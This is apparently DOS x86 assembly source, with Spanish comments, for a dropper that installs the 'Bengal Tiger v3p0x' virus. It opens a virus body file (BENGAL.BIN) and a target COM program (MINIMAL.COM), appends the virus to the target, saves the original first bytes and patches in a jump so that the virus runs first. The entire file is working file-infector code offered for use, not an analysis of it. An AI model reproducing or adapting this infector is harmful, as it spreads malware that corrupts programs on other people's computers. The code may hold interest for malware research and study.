

; DROPER para virus Bengal Tiger v3p0x

DOSSEG
	.MODEL TINY
	.CODE
	ORG 100H
Start:
	; El virus para instalarse desde un COM necesita:
	; 1 - Estar al final del file
	; 2 - Que el JMP al principio le de el control (y que sirva para guardar
	;		el offset del virus en memoria)
	; 3 - Que los primeros 20 (solo 3) bytes del file original esten en Header

	; Header => 000E

	; Abrir los dos files
	mov ax, 3d02h
	mov dx, offset Seed
	int 21h
	mov sHandle, ax
	mov ax, 3d02h
	mov dx, offset Infect
	int 21h
	mov iHandle, ax

	; Extraer size del virus y leerlo
	mov bx, sHandle
	mov ax, 4202h
	xor cx, cx
	xor dx, dx
	int 21h
	push ax
	push ax
	mov ax, 4200h
	xor cx, cx
	xor dx, dx
	int 21h
	pop cx
	mov dx, offset Virus
	mov ah, 3fh
	int 21h

	; Leer los bytes
	mov bx, iHandle
	mov ah, 3fh
	mov cx, 20h
	mov dx, offset Virus+0eh
	int 21h

	; Ir al final
	mov ax, 4202h
	xor cx, cx
	xor dx, dx
	int 21h
	sub ax, 3
	mov word ptr JmpM+1, ax

	; Escribir virus
	mov ah, 40h
	pop cx
	mov dx, offset Virus
	int 21h

	; Ir al principio
	mov ax, 4200h
	xor cx, cx
	xor dx, dx
	int 21h

	; Escribir el JMP
	mov ah, 40h
	mov cx, 3
	mov dx, offset JmpM
	int 21h

	mov ah, 3eh
	int 21h

	mov bx, sHandle
	mov ah, 3eh
	int 21h

	mov ah, 4ch
	int 21h

	Seed		db			"BENGAL.BIN", 0
	Infect	db			"MINIMAL.COM", 0
	sHandle	dw			0
	iHandle	dw			0
	JmpM		db			0e9h, 0, 0
	Virus		db			400h DUP('V')
END Start
